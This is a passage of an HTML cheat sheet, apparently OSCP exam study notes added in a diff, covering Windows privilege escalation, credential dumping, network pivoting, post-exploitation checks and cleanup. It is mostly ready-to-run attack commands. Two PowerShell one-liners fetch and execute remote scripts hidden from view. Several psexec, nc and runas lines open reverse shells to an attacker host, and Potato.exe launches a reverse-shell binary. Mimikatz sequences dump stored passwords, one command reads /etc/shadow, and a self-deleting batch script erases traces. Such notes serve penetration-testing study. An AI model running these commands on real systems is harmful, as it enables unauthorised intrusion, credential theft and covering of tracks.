+<li><div class="language-batch highlight"><pre><span></span><code><span id="__span-53-1"><a id="__codelineno-53-1" name="__codelineno-53-1" href="#__codelineno-53-1"></a>    windows-privesc-check2.exe -A --dump
+</span></code></pre></div></li>
+</ul>
+</li>
+<li>Check for missing patches:<ul>
+<li>WMIC: 
+<div class="language-batch highlight"><pre><span></span><code><span id="__span-54-1"><a id="__codelineno-54-1" name="__codelineno-54-1" href="#__codelineno-54-1"></a>    wmic qfe get Caption,Description,HotFixID,InstalledOn
+</span></code></pre></div></li>
+</ul>
+</li>
+<li>POTATO: by foxglovesec:
+<div class="language-batch highlight"><pre><span></span><code><span id="__span-55-1"><a id="__codelineno-55-1" name="__codelineno-55-1" href="#__codelineno-55-1"></a>    <span class="k">start</span> /b Potato.exe -ip 10.11.1.218 -cmd <span class="s2">&quot;C:\\temp\\rev.exe&quot;</span> -disable_exhaust true
+</span></code></pre></div></li>
+<li>
+<p>With Powershell</p>
+<ul>
+<li>PowerSploit-PowerUp.ps1:
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-56-1"><a id="__codelineno-56-1" name="__codelineno-56-1" href="#__codelineno-56-1"></a>    <span class="n">powershell</span> <span class="n">-exec</span> <span class="n">bypass</span> <span class="n">-windowstyle</span> <span class="n">hidden</span> <span class="n">-command</span> <span class="s2">&quot;IEX (New-Object System.Net.Webclient).DownloadString(&#39;http://$lhost:$lport/PowerUp.ps1&#39;);Invoke-AllChecks&quot;</span>
+</span></code></pre></div></li>
+<li>PowerSploit-PowerUp.ps1:<ul>
+<li>In PowerShell Exec BypassMode:<ul>
+<li><code class="language-powershell highlight"><span class="nb">Import-Module</span> <span class="p">.\</span><span class="n">PowerUp</span><span class="p">.</span><span class="n">ps1</span></code> \r\n then in another line <code class="language-powershell highlight"><span class="nb">Invoke-AllChecks</span></code></li>
+</ul>
+</li>
+</ul>
+</li>
+<li>PowerUp.ps1:<ul>
+<li><code class="language-powershell highlight"><span class="nb">Write-UserAddMSI</span></code> (if installedAlwaysElevated in On)</li>
+</ul>
+</li>
+<li>Sherlock:<ul>
+<li><div class="language-powershell highlight"><pre><span></span><code><span id="__span-57-1"><a id="__codelineno-57-1" name="__codelineno-57-1" href="#__codelineno-57-1"></a>    <span class="n">powershell</span> <span class="n">-exec</span> <span class="n">bypass</span> <span class="n">-windowstyle</span> <span class="n">hidden</span> <span class="n">-command</span> <span class="s2">&quot;IEX (New-Object System.Net.Webclient).DownloadString(&#39;http://$lhost:$lport/Sherlock.ps1&#39;);Find-AllVulns&quot;</span>
+</span></code></pre></div></li>
+</ul>
+</li>
+<li>JAWS:<a href="[JAWS](https://github.com/411Hall/JAWS.git)">^7</a></li>
+</ul>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-58-1"><a id="__codelineno-58-1" name="__codelineno-58-1" href="#__codelineno-58-1"></a>    <span class="n">CMD</span> <span class="n">C</span><span class="p">:\</span><span class="n">temp</span> <span class="n">powershell</span><span class="p">.</span><span class="n">exe</span> <span class="n">-ExecutionPolicy</span> <span class="n">Bypass</span> <span class="o">-File</span> <span class="p">.\</span><span class="n">jaws-enum</span><span class="p">.</span><span class="n">ps1</span> <span class="n">-OutputFilename</span> <span class="n">JAWS-Enum</span><span class="p">.</span><span class="n">txt</span>
+</span></code></pre></div>
+<ul>
+<li>POTATO: PS: Tater by Kevin Robertson</li>
+<li>Find SSH,RDP Creds: SessionGopher by FireEye</li>
+<li>Empire Privilege Escalation</li>
+<li>Also check <a href="wadcoms.github.io">wadcoms</a></li>
+</ul>
+</li>
+<li>
+<p>To NTAUTHORITY</p>
+<ul>
+<li>Escalating to NTAUTHORITY\System:
+<div class="language-batch highlight"><pre><span></span><code><span id="__span-59-1"><a id="__codelineno-59-1" name="__codelineno-59-1" href="#__codelineno-59-1"></a>    psexec.exe -accepteula -s -u $username cmd
+</span></code></pre></div></li>
+<li>Escalating to NTAUTHORITY\System (w/rdp):
+<div class="language-batch highlight"><pre><span></span><code><span id="__span-60-1"><a id="__codelineno-60-1" name="__codelineno-60-1" href="#__codelineno-60-1"></a>    psexec.exe -accepteula -s -u $username -p $password nc $lhost $lport C:\Windows\System32\cmd.exe
+</span></code></pre></div></li>
+<li>Escalating to NTAUTHORITY\System (w.o./rdp):
+<div class="language-batch highlight"><pre><span></span><code><span id="__span-61-1"><a id="__codelineno-61-1" name="__codelineno-61-1" href="#__codelineno-61-1"></a>    psexec.exe -accepteula -i -s C:\dir\dir\nc.exe $lhost $lport -e  C:\windows\system32\cmd.exe
+</span></code></pre></div></li>
+<li>Escalating to NTAUTHORITY\System: 
+<div class="language-batch highlight"><pre><span></span><code><span id="__span-62-1"><a id="__codelineno-62-1" name="__codelineno-62-1" href="#__codelineno-62-1"></a>    runas nc $lhost $lport C:\Windows\System32\cmd.exe
+</span></code></pre></div></li>
+</ul>
+</li>
+</ul>
+<hr />
+<h2 id="privilege-escalation-exploits">Privilege Escalation Exploits</h2>
+<ul>
+<li>LINUX: Ubuntu 11.04/11.10 or Linux Kernel 2.6.39  3.2.2 which covers 3.0.0 too BTW Memmodipper <a href="[Memmodipper](https://www.exploit-db.com/exploits/18411)">^8</a></li>
+<li>LINUX: DirtyCow: Ubuntu 12.04 LTS ,Ubuntu 14.04 LTS (Linux Mint 17.1),Debian 8 ,Ubuntu 16.04 LTS ,Ubuntu 16.10 ,RHEL 7, CentOS 7 ,RHEL 6, CentOS 6 ,RHEL 5, CentOS 5</li>
+<li>LINUX: CHKROOTKIT: 0.49 <a href="[chkrootkit](https://www.exploit-db.com/exploits/33899)">^9</a></li>
+</ul>
+<hr />
+<h2 id="dumping-credentials">Dumping Credentials</h2>
+<ul>
+<li>Mimikatz: Either PS Empire, Meterpreter, or direct download of exe file <a href="[Mimikatz](https://github.com/gentilkiwi/mimikatz/releases/latest)">^10</a></li>
+<li>Mimikatz:<ul>
+<li>Binary:
+<div class="language-text highlight"><pre><span></span><code><span id="__span-63-1"><a id="__codelineno-63-1" name="__codelineno-63-1" href="#__codelineno-63-1"></a>    log
+</span><span id="__span-63-2"><a id="__codelineno-63-2" name="__codelineno-63-2" href="#__codelineno-63-2"></a>    privilege::debug
+</span><span id="__span-63-3"><a id="__codelineno-63-3" name="__codelineno-63-3" href="#__codelineno-63-3"></a>    sekurlsa::logonPasswords
+</span><span id="__span-63-4"><a id="__codelineno-63-4" name="__codelineno-63-4" href="#__codelineno-63-4"></a>    lsadump::sam
+</span><span id="__span-63-5"><a id="__codelineno-63-5" name="__codelineno-63-5" href="#__codelineno-63-5"></a>    lsadump::secrets
+</span><span id="__span-63-6"><a id="__codelineno-63-6" name="__codelineno-63-6" href="#__codelineno-63-6"></a>    lsadump::cache
+</span><span id="__span-63-7"><a id="__codelineno-63-7" name="__codelineno-63-7" href="#__codelineno-63-7"></a>    vault::cred
+</span><span id="__span-63-8"><a id="__codelineno-63-8" name="__codelineno-63-8" href="#__codelineno-63-8"></a>    vault:list
+</span></code></pre></div></li>
+</ul>
+</li>
+<li><code class="language-batch highlight">wce.exe -w</code> [^11]
+[^11]: <a href="https://www.ampliasecurity.com/research.html">Amplia Security</a></li>
+<li><code class="language-batch highlight">fgdump.exe</code> <a href="[Foofus](http://foofus.net/goons/fizzgig/fgdump/downloads.htm)">^12</a></li>
+</ul>
+<hr />
+<h2 id="network-pivoting">Network Pivoting</h2>
+<ul>
+<li>Windows:<ul>
+<li>Plink:
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-64-1"><a id="__codelineno-64-1" name="__codelineno-64-1" href="#__codelineno-64-1"></a><span class="w">    </span>plink<span class="w"> </span><span class="nv">$lhost</span><span class="w"> </span>-P<span class="w"> </span><span class="m">22</span><span class="w"> </span>-C<span class="w"> </span>-R<span class="w"> </span><span class="m">127</span>.0.0.1:<span class="nv">$lport</span>:<span class="nv">$rhost</span>:<span class="nv">$rport</span>
+</span></code></pre></div></li>
+</ul>
+</li>
+<li>Linux:<ul>
+<li>
+<p>Proxychains: 
+    *
+    <div class="language-bash highlight"><pre><span></span><code><span id="__span-65-1"><a id="__codelineno-65-1" name="__codelineno-65-1" href="#__codelineno-65-1"></a><span class="w">    </span>ssh<span class="w"> </span>-D<span class="w"> </span><span class="m">127</span>.0.0.1:<span class="nv">$lport</span><span class="w"> </span>-p<span class="w"> </span><span class="m">22</span><span class="w"> </span><span class="nv">$ruser</span>@pivot-target-ip
+</span></code></pre></div></p>
+<ul>
+<li>
+<p>(Add socks4 127.0.0.1 $lport in /etc/proxychains.conf)</p>
+</li>
+<li>
+<p>[all_cmds_on_kali] 
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-66-1"><a id="__codelineno-66-1" name="__codelineno-66-1" href="#__codelineno-66-1"></a><span class="w">    </span>ssh<span class="w"> </span>-D<span class="w"> </span><span class="nv">$proxychainsport</span><span class="w"> </span>-p<span class="w"> </span><span class="m">22</span><span class="w"> </span><span class="nv">$ruser</span>@<span class="nv">$rhost</span>
+</span></code></pre></div></p>
+<ul>
+<li>(Add in last line in /etc/proxychains.conf: socks4 127.0.0.1 $proxychainsport )</li>
+<li>proxychains [command )i.e. nmap . ..)]</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<hr />
+<h2 id="oscp-post-checks">OSCP Post Checks</h2>
+<ul>
+<li>
+<p>Windows:</p>
+<ul>
+<li>Plink:
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-67-1"><a id="__codelineno-67-1" name="__codelineno-67-1" href="#__codelineno-67-1"></a><span class="w">    </span>plink<span class="w"> </span><span class="nv">$lhost</span><span class="w"> </span>-P<span class="w"> </span><span class="m">22</span><span class="w"> </span>-C<span class="w"> </span>-R<span class="w"> </span><span class="m">127</span>.0.0.1:<span class="nv">$lport</span>:<span class="nv">$rhost</span>:<span class="nv">$rport</span>
+</span></code></pre></div></li>
+<li>
+<p>CREDENTIALS DUMP(<code>mimikatz,wce,fgdump</code>) then 
+<div class="language-batch highlight"><pre><span></span><code><span id="__span-68-1"><a id="__codelineno-68-1" name="__codelineno-68-1" href="#__codelineno-68-1"></a>    systeminfo <span class="p">&amp;</span> ipconfig <span class="p">&amp;</span> route print <span class="p">&amp;</span> arp -a <span class="p">&amp;</span> <span class="k">dir</span> /s network-secret.txt <span class="p">&amp;</span> <span class="k">dir</span> /s *pass* <span class="p">&amp;</span> psloggedon.exe -accepteula
+</span></code></pre></div></p>
+</li>
+<li>
+<p>ProxyChains:</p>
+<ul>
+<li>proxychain via ssh to target then:<ul>
+<li>proxychains /root/Tools/post_checks.sh</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p>[all_cmds_on_kali]
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-69-1"><a id="__codelineno-69-1" name="__codelineno-69-1" href="#__codelineno-69-1"></a><span class="w">    </span>ssh<span class="w"> </span>-D<span class="w"> </span><span class="nv">$proxychainsport</span><span class="w"> </span>-p<span class="w"> </span><span class="m">22</span><span class="w"> </span><span class="nv">$ruser</span>@<span class="nv">$rhost</span>
+</span></code></pre></div></p>
+<ul>
+<li>(Add in last line in /etc/proxychains.conf: socks4 127.0.0.1 $proxychainsport )</li>
+<li>proxychains [command )i.e. nmap . ..)]</li>
+</ul>
+</li>
+<li>
+<p>Enable RDP:<a href="[Foofus](http://foofus.net/goons/fizzgig/fgdump/downloads.htm)">^12</a>: <a href="https://www.hacking-tutorial.com/tips-and-trick/how-to-enable-remote-desktop-using-command-prompt/">Hacking Tutorial</a></p>
+</li>
+</ul>
+</li>
+<li>
+<p>Linux:
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-70-1"><a id="__codelineno-70-1" name="__codelineno-70-1" href="#__codelineno-70-1"></a><span class="w">    </span>ls<span class="w"> </span>/root<span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span>cat<span class="w"> </span>/root/proof.txt<span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span>find<span class="w"> </span>/<span class="w"> </span>-name<span class="w"> </span>network-secret.txt<span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span>cat<span class="w"> </span>/etc/shadow<span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span>route<span class="w"> </span>-n<span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span>arp<span class="w"> </span>-a<span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span>ifconfig<span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span>netstat<span class="w"> </span>-plunt<span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span>w<span class="w">  </span>
+</span></code></pre></div></p>
+</li>
+</ul>
+<hr />
+<h2 id="house-cleaning">House Cleaning</h2>
+<ul>
+<li>Generic - Remove Reverse Shells</li>
+<li>Generic - Remove Reverse Meterpreter</li>
+<li>Generic - Remote Accounts</li>
+<li>Web - Reverse/Bind PHP files</li>
+<li>Web - Remove Reflected XSS Entries</li>
+<li>Windows - Remove Task Scheduler</li>
+<li>Windows - Remove Registry</li>
+<li>Windows - Remove Startup Folder</li>
+<li>Linux - Remove Crontab entries</li>
+<li>Linux - Remove Cron.d entries</li>
+<li>Linux - Remove rc.local entries</li>
+<li>Linux - Remove /etc/init.d/ entries</li>
+<li>Linux - Remove Sysctl entries</li>
+<li>Phishing - Removal of Phishing email</li>
+<li>Malware - Activate Kill Switch</li>
+<li>Malware - Cleanup manually</li>
+<li>Self Deleting Batch Command:
+<div class="language-batch highlight"><pre><span></span><code><span id="__span-71-1"><a id="__codelineno-71-1" name="__codelineno-71-1" href="#__codelineno-71-1"></a>    <span class="k">echo</span> timeout /t 60 <span class="p">&gt;&gt;</span>  cleanupselfdelete.bat
+</span><span id="__span-71-2"><a id="__codelineno-71-2" name="__codelineno-71-2" href="#__codelineno-71-2"></a>    <span class="k">echo</span> del reverse_shell.exe <span class="p">&gt;&gt;</span> cleanupselfdelete.bat
+</span><span id="__span-71-3"><a id="__codelineno-71-3" name="__codelineno-71-3" href="#__codelineno-71-3"></a>    <span class="k">echo</span> <span class="se">^(</span>goto<span class="se">^)</span> 2<span class="se">^n</span>ul <span class="se">^ </span>del <span class="se">^&quot;</span><span class="nv">%~f0</span><span class="se">^&quot;</span> <span class="p">&gt;&gt;</span> cleanupselfdelete.bat
+</span><span id="__span-71-4"><a id="__codelineno-71-4" name="__codelineno-71-4" href="#__codelineno-71-4"></a>    <span class="k">start</span> cleanupselfdelete.bat
+</span></code></pre></div></li>
+</ul>
+<hr />
+<h2 id="cheatsheets">CheatSheets</h2>
+<ul>
+<li>Common Commands <a href="[neomh](https://github.com/neomh/cheat-sheets/blob/master/Commands)">^13</a></li>
+<li>Pentest Monkey[^14]
+[^14]: <a href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">Pentest monkey</a></li>
+<li><em>UPDATE January 2021: This cheatsheet!</em></li>
+</ul>
+<hr />
+<h2 id="other-resources">Other Resources</h2>
+<ul>
+<li>VA-UK<a href="[Vulnerabilityassessment.co](http://www.vulnerabilityassessment.co.uk/Penetration%20Test.html)">^15</a></li>
+<li>Password List<a href="[SecLists](https://github.com/danielmiessler/SecLists/tree/master/Passwords/Common-Credentials)">^16</a></li>
+<li>Escaping Shell[^17]
+[^17]: <a href="https://speakerdeck.com/knaps/escape-from-shellcatraz-breaking-out-of-restricted-unix-shells">Escape from shellcatraz</a></li>
+</ul>
+<hr />
+<h2 id="oscp-resources">OSCP Resources</h2>
+<ul>
+<li>Noobpad <a href="[ianthomasfry](https://ianthomasfry.blogspot.com/2017/05/oscp-exam-study-guide-i-first-steps.html)">^18</a></li>
+<li>Sec Juice[^19]
+[^19]: <a href="https://www.secjuice.com/oscp-prep-guidance/">Sec Juice</a></li>
+<li>scund00r<a href="[scund00r](https://scund00r.com/all/oscp/2018/02/25/passing-oscp.html)">^20</a></li>
+<li>backdoorshell<a href="[backdoorshell](https://backdoorshell.gitbooks.io/oscp-useful-links/content/fuzzing.html)">^21</a></li>
+<li>0xc0ffee<a href="[0xc0ffee](http://0xc0ffee.io/blog/OSCP-Goldmine)">^22</a></li>
+<li>swisskyrepo<a href="[swisskyrepo](https://github.com/swisskyrepo/PayloadsAllTheThings/)">^23</a></li>
+<li>ihack4falafel<a href="[ihack4falafel](https://github.com/ihack4falafel/OSCP/blob/master/Documents/Bookmark%20List.pdf)">^24</a></li>
+<li>kevsec<a href="[kevsec](http://kevsec.fr/resources/)">^25</a></li>
+<li>futureoscp<a href="[futureoscp](http://futureoscp.blogspot.com/2017/10/usefull-oscp-material.html)">^26</a></li>
+</ul>
+<p>[^33]: <a href="https://www.gracefulsecurity.com/path-traversal-cheat-sheet-windows/">Graceful security</a></p>
+<p>[^35]: <a href="https://www.youtube.com/watch?v=1fkgo4hsyp8">Ethical Hackers Club</a></p>
+
+  <br>
+    
+
+    <br>
+</div>
+
+<footer class="col-md-12 wm-page-content">
+      <p>
+        <a href="https://github.com/readloud/readloud.github.io/releases/tag/themes/edit/master/docs/explore/resource/general.md"><i class="fa fa-github"></i>
+Edit on GitHub</a>
+      </p>
+  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="https://github.com/noraj/mkdocs-windmill-dark">Windmill Dark</a> theme by Alexandre ZANNI (noraj).</p>
+<p>        ⚠️ The quieter you become, the more you are able to hear 🥷</p>
+</footer>
+
+</body>
+</html>
